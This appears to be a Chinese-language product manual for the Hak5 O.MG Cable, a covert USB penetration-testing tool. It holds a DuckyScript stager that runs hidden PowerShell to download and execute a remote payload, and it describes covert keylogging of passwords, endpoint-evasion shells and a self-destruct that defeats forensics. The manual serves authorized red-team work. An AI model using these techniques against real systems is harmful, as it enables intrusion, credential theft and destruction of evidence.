---
title：「Hak5 O.MG Cable 原廠技術說明書與全功能操作手冊」
model：「O.MG Cable」
manufacturer：「Hak5」
category：「隱蔽實體與無線 HID 滲透測試專用線纜 (Covert Physical & Wireless Cable)」
docs_url：「https://o.mg.lol/setup/OMGCable/」
version：「3.0」
locale：「zh-tw」
---

# Hak5 O.MG Cable 原廠技術說明書與全功能操作手冊

> Hak5 O.MG Cable 是一款手工精製的高階實體滲透測試專用線纜。外觀與一般原廠充電傳輸線完全無異，內部卻隱蔽整合了完整的微控制器運算平台、802.11 Wi-Fi 無線電收發模組、DuckyScript 高速按鍵注入引擎、硬體級鍵盤側錄器（Keylogger）與突破性的 HIDX StealthLink 雙向隱蔽通訊通道。

---

## 目錄

- [**1. 產品概述與硬體架構**](#1-產品概述與硬體架構)
  - [1.1 產品定位與威脅情境分析](#11-產品定位與威脅情境分析)
  - [1.2 技術規格與硬體校準基準表](#12-技術規格與硬體校準基準表)
  - [1.3 主動端與被動端之物理定向機制](#13-主動端與被動端之物理定向機制)
  - [1.4 多元接頭規格與線纜型號識別](#14-多元接頭規格與線纜型號識別)
- [**2. 硬體初始化、韌體燒錄與網路連線**](#2-硬體初始化韌體燒錄與網路連線)
  - [2.1 使用 O.MG Programmer 進行出廠啟用](#21-使用-omg-programmer-進行出廠啟用)
  - [2.2 透過 O.MG Web Flasher 進行瀏覽器韌體燒錄](#22-透過-omg-web-flasher-進行瀏覽器韌體燒錄)
  - [2.3 進階 Python Flasher 離線命令列燒錄](#23-進階-python-flasher-離線命令列燒錄)
  - [2.4 建立 Wi-Fi 無線基地台連線](#24-建立-wi-fi-無線基地台連線)
  - [2.5 網頁管理控制台與使用者端模式設定](#25-網頁管理控制台與使用者端模式設定)
- [**3. 核心功能、按鍵注入與 DuckyScript 引擎**](#3-核心功能按鍵注入與-duckyscript-引擎)
  - [3.1 O.MG 酬載執行引擎與極速按鍵注入](#31-omg-酬載執行引擎與極速按鍵注入)
  - [3.2 DuckyScript for O.MG 擴充語法與指令集](#32-duckyscript-for-omg-擴充語法與指令集)
  - [3.3 鍵盤側錄器運作與即時擊鍵攔截 (Keylogger)](#33-鍵盤側錄器運作與即時擊鍵攔截-keylogger)
  - [3.4 磁區編輯器與酬載槽位彈性設定 (Partition Editor)](#34-磁區編輯器與酬載槽位彈性設定-partition-editor)
  - [3.5 多語系鍵盤對應表檢視器 (Keymap Viewer)](#35-多語系鍵盤對應表檢視器-keymap-viewer)
- [**4. HIDX StealthLink 與隱蔽資料通道**](#4-hidx-stealthlink-與隱蔽資料通道)
  - [4.1 HIDX StealthLink 雙向傳輸技術架構](#41-hidx-stealthlink-雙向傳輸技術架構)
  - [4.2 Windows PowerShell 互動式 Shell 與 TCP 外傳](#42-windows-powershell-互動式-shell-與-tcp-外傳)
  - [4.3 Linux 互動式 Shell 與原始資料導出](#43-linux-互動式-shell-與原始資料導出)
  - [4.4 macOS Python 互動式端點管道](#44-macos-python-互動式端點管道)
  - [4.5 實務部署時序與最佳化建議](#45-實務部署時序與最佳化建議)
- [**5. 雲端艦隊管理、防禦規避與系統維護**](#5-雲端艦隊管理防禦規避與系統維護)
  - [5.1 Hak5 Cloud C² 雲端集中管控整合](#51-hak5-cloud-c-雲端集中管控整合)
  - [5.2 WebSocket API 自動化程式介面](#52-websocket-api-自動化程式介面)
  - [5.3 地理圍欄防禦與邊界失效保護 (Geofencing)](#53-地理圍欄防禦與邊界失效保護-geofencing)
  - [5.4 緊急硬體自毀抹除機制 (Self-Destruct)](#54-緊急硬體自毀抹除機制-self-destruct)
  - [5.5 晶片校準、故障排查與復原流程](#55-晶片校準故障排查與復原流程)

---

## 1. 產品概述與硬體架構

<!-- section：overview -->
本章節深入剖析 Hak5 O.MG Cable 實體線纜的產品架構、微控制器技術細節與硬體基準真相表。

### 1.1 產品定位與威脅情境分析

在傳統資安認知中，周邊充電線與傳輸線常被視為毫無運算能力的被動元件。然而，諸如美國國安局（NSA）早期的 COTTONMOUTH-I 等硬體植入技術證明，在線纜接頭內部植入微型晶片能達成前所未有的物理旁路入侵。

O.MG Cable 將高階國家級硬體植入技術平民化，具備極致的隱蔽性：
- **實體外觀零瑕疵**：採用工業級高壓注塑工藝，接頭長度、重量、線身柔韌度均與各大品牌原廠線纜一致，無任何可疑突起或粗糙外殼。
- **資料線完全電氣透明**：在未觸發酬載的待機狀態下，USB 資料傳輸線（D+/D-）保持純被動導通狀態，作業系統底層不會產生任何 USB 裝置枚舉（Enumeration）事件，徹底規避端點防護軟體（EDR/MDM）之硬體監控。
- **超長距無線空中觸發**：內建 2.4 GHz Wi-Fi 晶片與微型射頻天線，紅隊測試員可在百公尺外透過智慧型手機或筆記型電腦遠端連線觸發攻擊。

### 1.2 技術規格與硬體校準基準表

| 硬體規格細項 | 原廠官方技術規格基準 |
|---|---|
| **設備架構** | 隱蔽嵌合式微控制器 USB 滲透專用傳輸線 |
| **射頻模組** | 整合式 802.11 b/g/n (2.4 GHz) Wi-Fi 無線電與微型 PCB 天線 |
| **工作電壓** | 固定 5 V DC (+/- 0.5 V) 透過主機端 USB 介面供電 |
| **電流量消耗** | 待機：~80–120 mA；尖峰發射：最高 350 mA；供電需求門檻：500 mA |
| **資料透傳效能** | USB 2.0 高速 (480 Mbps) 全速透傳 (酬載閒置時完全透明導通) |
| **電力透傳規範** | 支援固定 5 V 充電透傳；USB-PD (Power Delivery) 協定最高協商至 5 V |
| **接頭規格型號** | USB-A to USB-C、USB-C to USB-C、USB-A to Lightning、USB-C to Lightning |
| **儲存磁區容量** | 非揮發性快閃記憶體 (劃分為系統區、Web 控制台與酬載區) |
| **酬載槽位數量** | Basic 基礎版：8 組槽位；Plus 與 Elite 進階版：最高支援 200 組槽位 |
| **側錄緩衝記憶體** | Keylogger 版：內建約 650,000 次按鍵歷史紀錄之加密儲存空間 |
| **鍵盤硬體相容** | Full Speed 全速 USB 鍵盤 (相容 12 Mbps 標準 HID 通訊協定) |
| **按鍵注入速率** | 每分鐘最高 890 字 (WPM)，支援硬體級 USB 超頻注入技術 |
| **雙向隱蔽通道** | HIDX StealthLink (利用標準 HID Report 實現雙向端點通道) |
| **安全防護機制** | WPA2 無線加密、BSSID 地理圍欄 (Geofencing)、硬體等級緊急自毀 |

### 1.3 主動端與被動端之物理定向機制

所有的 O.MG Cable 均具備嚴格的**物理方向性**：
1. **主動端 (Active End)**：
   - 內含微控制器、Wi-Fi 模組與按鍵注入矩陣。
   - **必須連接至被測目標主機**。
   - 所有的 DuckyScript 按鍵注入、HIDX 通道均由此端向目標電腦發送。
   - 燒錄韌體時，亦必須將此主動端插入 O.MG Programmer。
2. **被動/透傳端 (Passthrough End)**：
   - 用於連接一般周邊（如智慧型手機、實體鍵盤、滑鼠或 USB 隨身碟）。
   - 負責將下游設備的資料與充電電力透明導通至主動端。

> [!WARNING]
> 若將被動端插入目標電腦、主動端插入手機，手機將正常充電，但線纜將完全無法向目標電腦注入按鍵指令！

### 1.4 多元接頭規格與線纜型號識別

- **Type-A to Type-C**：Type-A 端為 Active End；Type-C 端為 Passthrough End。
- **Type-A to Lightning**：Type-A 端為 Active End；Lightning 端為 Passthrough End。
- **Type-C to Lightning**：Type-C 端為 Active End；Lightning 端為 Passthrough End。
- **Type-C to Type-C**：由於雙向接頭外觀一致，Active 端接頭外殼雷雕有專屬標誌，或隨機附有識別夾；插入 O.MG Programmer 時，僅當 Active 端插入時指示燈才會點亮。

---

## 2. 硬體初始化、韌體燒錄與網路連線

<!-- section：configuration -->
本章節提供出廠啟用、網頁序列燒錄以及 Wi-Fi 管理網路的完整操作步驟。

### 2.1 使用 O.MG Programmer 進行出廠啟用

為遵循各國無線電射頻輸出與出入口法規，所有 O.MG 設備出廠時均處於「未啟用」的休眠狀態。

初次使用必須搭配 **O.MG Programmer** 進行啟用：
1. 確認 O.MG Cable 的**主動端 (Active End)**。
2. 將主動端確實插入 O.MG Programmer 的母座。
3. 將 O.MG Programmer 插入管理電腦的 USB 連接埠。
4. 若使用 Windows 系統，請確保已安裝 Silicon Labs CP2102 虛擬 COM 埠驅動程式。

### 2.2 透過 O.MG Web Flasher 進行瀏覽器韌體燒錄

官方提供免安裝的 Chrome 網頁序列埠燒錄工具：
1. 使用 Google Chrome、Brave 或 Edge 瀏覽器開啟：`https://o-mg.github.io/WebFlasher/`
2. 點選畫面上的 **Connect** 按鈕。
3. 在瀏覽器跳出的序列埠選單中選取 `CP2102 USB to UART Bridge Controller`。
4. 依指示選取設備型號（O.MG Cable）與欲安裝之最新韌體版本。
5. 點選 **Install Firmware**，工具將自動完成清除 Flash、寫入系統分割區與校驗程序。
6. 燒錄完成後，螢幕將顯示預設無線網路資訊：
   - **預設 SSID**：`O.MG`
   - **預設密碼**：`12345678`
   - **預設管理 IP**：`http://192.168.4.1`

### 2.3 進階 Python Flasher 離線命令列燒錄

對於機密隔離環境或批次自動化燒錄需求，可使用官方 Python 工具：
```bash
git clone https://github.com/O-MG/O.MG-Firmware.git
cd O.MG-Firmware
pip3 install esptool pyserial
python3 flasher.py
```
支援離線寫入預載酬載、客製化出廠 SSID 及 Flash 完整二進位備份。

### 2.4 建立 Wi-Fi 無線基地台連線

1. 將 O.MG Cable 主動端插入任何可供電之 5 V USB 連接埠（電腦或行動電源）。
2. 在管理電腦或手機之 Wi-Fi 清單中搜尋 `O.MG`。
3. 輸入密碼 `12345678` 進行配對。
4. 連線建立後，端點設備將自動取得 `192.168.4.x` 網段 IP。

### 2.5 網頁管理控制台與使用者端模式設定

在瀏覽器輸入 `http://192.168.4.1` 進入響應式 Web UI：
- **即時觸發面板**：單鍵執行預存於各槽位的按鍵注入腳本。
- **線上記錄器**：線上查看鍵盤側錄日誌與系統除錯訊息。
- **網路模式切換**：可從 Access Point（AP 基地台模式）切換為 Station（Wi-Fi Client 使用者端模式），讓 O.MG Cable 主動連線至現場企業 Wi-Fi 或滲透人員的手機熱點。

---

## 3. 核心功能、按鍵注入與 DuckyScript 引擎

<!-- section：features -->
本章節說明 DuckyScript for O.MG 的進階語法、鍵盤側錄機能與磁區管理。

### 3.1 O.MG 酬載執行引擎與極速按鍵注入

O.MG Cable 將指令轉換為底層 USB HID 鍵盤掃描碼直接送交目標作業系統，速度最高可達每分鐘 890 字，能瞬間於目標主機上快顯端點機並完成反向連線部署。

### 3.2 DuckyScript for O.MG 擴充語法與指令集

相容標準 DuckyScript 語法，並加入 O.MG 專屬硬體控制指令：
- `BLINK <次數>`：使機身隱藏之診斷 LED 閃爍特定次數。
- `WAIT_FOR_BUTTON_PRESS`：暫停執行，直至操作者於 Web 介面點選確認。
- `GEOFENCE_CHECK`：即時檢驗周邊環境 BSSID 是否符合授權範圍。
- `SELF_DESTRUCT`：立即執行不可逆之硬體自毀。

#### 實戰範例：無痕下載執行腳本
```text
REM O.MG Windows Quick Stager
DELAY 1500
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden -Exec Bypass「IEX(New-Object Net.WebClient).DownloadString(『http://192.168.4.1/payload.ps1』)」
ENTER
```

### 3.3 鍵盤側錄器運作與即時擊鍵攔截 (Keylogger)

針對配備 Keylogger 模組之版本：
- 當下游插入實體鍵盤時，O.MG Cable 會以全速（Full Speed 12 Mbps）截獲所有打字封包。
- 內建非揮發性記憶體可儲存高達 **650,000 次按鍵輸入**，即便線纜斷電拔除，記錄依然完整保存。
- 支援 Web UI 即時串流顯示，操作者可在遠端即時目擊目標輸入之帳號、密碼與機密對話。

### 3.4 磁區編輯器與酬載槽位彈性設定 (Partition Editor)

內建圖形化 Partition Editor：
- 自由調整系統 Flash 分配比例（分配更多空間給側錄日誌或大型多階段酬載）。
- 支援多達 200 組獨立酬載槽位，方便在不同攻擊目標之間迅速切換。

### 3.5 多語系鍵盤對應表檢視器 (Keymap Viewer)

由於 USB 傳遞的是實體鍵盤按鍵碼（Scancodes），作業系統會依語系設定轉譯字符。內建 Keymap Viewer 支援美規、英規、德規、法規、日規等多國鍵盤對應，徹底避免因符號映射錯位導致語法執行失敗。

---

## 4. HIDX StealthLink 與隱蔽資料通道

傳統隨身碟容易被企業資安政策全面封鎖，而出站網路連線亦常受防火牆阻擋。**HIDX StealthLink** 徹底突破此一僵局。

### 4.1 HIDX StealthLink 雙向傳輸技術架構

StealthLink 利用 USB 人機介面裝置（HID）規範中的標準 Feature Reports 封包建立通訊：
- 完全無需在目標電腦安裝特殊驅動程式。
- 作業系統原生信任 HID 鍵盤與滑鼠通訊，封包不會觸發任何端點防護警報。
- 建立一個完全獨立於主機網路卡之外的**實體隱蔽雙向通道**。

### 4.2 Windows PowerShell 互動式 Shell 與 TCP 外傳

注入微型 PowerShell 通訊程式碼後，目標電腦會將本機 Shell 導向至 USB HID 端點。操作者在 O.MG 網頁端即可獲得一個完整的互動式 `powershell.exe` 控制台，並能雙向傳輸二進位檔案。

### 4.3 Linux 互動式 Shell 與原始資料導出

在 Linux 主機上，StealthLink 透過 `/dev/hidraw` 節點進行通訊，建立無網路 Socket 連線的隱形 Bash 反彈端點。

### 4.4 macOS Python 互動式端點管道

利用 macOS 內建之 POSIX 或 IOKit 介面，隱蔽開啟端點機管道，完全不在畫面上跳出視窗。

### 4.5 實務部署時序與最佳化建議

Feature Report 每次以 64 位元組區塊進行分包傳輸，有效通訊速率介於 15 KB/s 至 60 KB/s 之間，足夠進行憑證導出、日誌提取與即時指令下發。

---

## 5. 雲端艦隊管理、防禦規避與系統維護

<!-- section：maintenance -->
本章節說明雲端整合、地理圍欄防禦與硬體自毀復原準則。

### 5.1 Hak5 Cloud C² 雲端集中管控整合

將 O.MG Cable 設定為 Station 模式連上網際網路後，即可註冊至私有 Hak5 Cloud C² 伺服器，實現跨國遠端觸發與資料即時彙總。

### 5.2 WebSocket API 自動化程式介面

提供標準 WebSocket 介面（埠號 80/8080），支援以 Python、Go 或 Node.js 撰寫自動化外掛，與外部 C2 框架深度整合。

### 5.3 地理圍欄防禦與邊界失效保護 (Geofencing)

可設定現場特定 Wi-Fi BSSID（基地台 MAC 位址）。若線纜被攜離目標企業大樓（偵測不到特定 MAC），設備將自動關閉無線發射並進入假死狀態，防止機敏工具外流。

### 5.4 緊急硬體自毀抹除機制 (Self-Destruct)

在面臨實體查扣或資安搜查的極端情境下：
- 操作者可透過 Web UI 或遠端指令發動 `Self-Destruct`。
- 晶片將瞬間覆寫所有 Flash 儲存區、銷毀加密金鑰並切斷微控制器通訊，將設備永久還原為一條毫無攻擊能力的普通充電線，使鑑識實驗室無法還原任何數位證據。

### 5.5 晶片校準、故障排查與復原流程

若因非預期斷電導致系統異常：
1. 將主動端重新插入 O.MG Programmer。
2. 進入 Web Flasher 執行完整 Erase & Flash 流程，即可復原出廠預設韌體。
